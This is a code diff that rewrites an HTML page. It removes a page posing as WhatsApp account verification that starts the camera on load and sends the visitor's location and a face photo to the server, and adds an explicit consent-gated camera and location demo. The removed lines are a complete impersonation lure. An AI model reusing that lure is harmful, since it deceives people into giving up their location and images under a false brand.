@@ -2,88 +2,161 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>WhatsApp Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Camera + Location Consent Demo</title>
   <style>
     body {
-      background-color: #ECE5DD;
+      background-color: #f4f4f4;
       font-family: 'Segoe UI', sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
+      padding: 16px;
     }
     .box {
-      background-color: #fff;
-      border-radius: 15px;
+      background: #fff;
+      border-radius: 14px;
       padding: 20px;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
-      text-align: center;
+      width: 100%;
+      max-width: 460px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
     }
-    .logo {
-      width: 100px;
-      margin-bottom: 10px;
+    h2 { margin-top: 0; }
+    .notice {
+      background: #eef6ff;
+      border-left: 4px solid #2d6cdf;
+      padding: 10px;
+      margin-bottom: 14px;
+      font-size: 14px;
     }
+    .controls { margin-top: 12px; }
     button {
-      padding: 12px 20px;
-      margin: 10px 5px;
-      font-size: 16px;
+      padding: 10px 14px;
+      margin: 6px 4px 0 0;
+      font-size: 14px;
       border: none;
       border-radius: 8px;
-      background-color: #25D366;
-      color: white;
+      background-color: #2d6cdf;
+      color: #fff;
       cursor: pointer;
     }
+    button[disabled] { opacity: .55; cursor: not-allowed; }
+    video { width: 100%; border-radius: 8px; background: #111; margin-top: 8px; }
+    .status { margin-top: 10px; font-size: 13px; color: #333; min-height: 18px; }
+    .small { font-size: 12px; color: #555; margin-top: 12px; }
   </style>
 </head>
 <body>
   <div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-    <h3>Verify Your WhatsApp Account</h3>
-    <p>To continue, please allow location access & verify camera</p>
-    
-    <button onclick="getLocation()">📍 Allow Location</button><br>
-    <video id="video" width="100%" autoplay></video><br>
-    <button onclick="capture()">📸 Capture Face</button>
-    
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <h2>Camera + Location Consent Demo</h2>
+    <div class="notice">
+      This demo only captures data after explicit consent and stores it locally on this server.
+    </div>
+
+    <label>
+      <input id="consent" type="checkbox">
+      I agree to share my location and camera image for this demo.
+    </label>
+
+    <div class="controls">
+      <button id="startCamera" disabled>Start Camera</button>
+      <button id="captureBtn" disabled>Capture Image</button>
+      <button id="locationBtn" disabled>Share Location</button>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="320" height="240" style="display:none"></canvas>
+    <div id="status" class="status"></div>
+    <div class="small">View saved images at <a href="/gallery" target="_blank" rel="noopener">/gallery</a></div>
   </div>
 
   <script>
-    // 📍 Location code
-    function getLocation() {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        fetch("/log?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
-        alert("✅ Location captured");
-      }, function(err) {
-        alert("❌ Location access denied");
-      });
-    }
-
-    // 📸 Camera capture code
+    const consent = document.getElementById('consent');
+    const startCameraBtn = document.getElementById('startCamera');
+    const captureBtn = document.getElementById('captureBtn');
+    const locationBtn = document.getElementById('locationBtn');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
+    const statusEl = document.getElementById('status');
+    const ctx = canvas.getContext('2d');
 
-    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-      video.srcObject = stream;
+    let stream;
+
+    const setStatus = (msg, isError = false) => {
+      statusEl.textContent = msg;
+      statusEl.style.color = isError ? '#b00020' : '#1f2937';
+    };
+
+    consent.addEventListener('change', () => {
+      const enabled = consent.checked;
+      startCameraBtn.disabled = !enabled;
+      locationBtn.disabled = !enabled;
+      captureBtn.disabled = !enabled || !stream;
     });
 
-    function capture() {
-      context.drawImage(video, 0, 0, 320, 240);
+    startCameraBtn.addEventListener('click', async () => {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        captureBtn.disabled = false;
+        setStatus('Camera started.');
+      } catch (err) {
+        setStatus('Camera access denied or unavailable.', true);
+      }
+    });
+
+    captureBtn.addEventListener('click', async () => {
+      if (!stream) {
+        setStatus('Start camera first.', true);
+        return;
+      }
+
+      ctx.drawImage(video, 0, 0, 320, 240);
       const imageData = canvas.toDataURL('image/png');
-      fetch('/upload', {
-        method: 'POST',
-        body: JSON.stringify({ image: imageData }),
-        headers: {
-          'Content-Type': 'application/json'
+
+      try {
+        const res = await fetch('/upload', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image: imageData })
+        });
+
+        if (!res.ok) throw new Error('Upload failed');
+        setStatus('Image captured and saved.');
+      } catch (err) {
+        setStatus('Could not upload image.', true);
+      }
+    });
+
+    locationBtn.addEventListener('click', () => {
+      if (!navigator.geolocation) {
+        setStatus('Geolocation not supported in this browser.', true);
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        try {
+          const res = await fetch('/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude
+            })
+          });
+
+          if (!res.ok) throw new Error('Location save failed');
+          setStatus('Location shared and saved.');
+        } catch (err) {
+          setStatus('Could not save location.', true);
         }
-      }).then(() => alert("✅ Image captured & sent"));
-    }
+      }, () => {
+        setStatus('Location access denied.', true);
+      });
+    });
   </script>
 </body>
 </html>
-
